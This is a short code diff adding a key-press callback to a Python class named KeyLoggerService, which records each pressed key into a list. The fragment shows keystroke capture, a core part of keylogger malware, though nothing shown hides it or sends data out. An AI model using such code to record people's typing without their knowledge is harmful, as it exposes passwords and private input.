@@ -19,3 +19,9 @@ class KeyLoggerService(IKeyLogger):
     def init(self):
         self.logged_keys = []
         self.listener = None
+
+    def _on_press(self, key):
+        try:
+            self.logged_keys.append(key.char)
+        except AttributeError:
+            self.logged_keys.append(str(key))
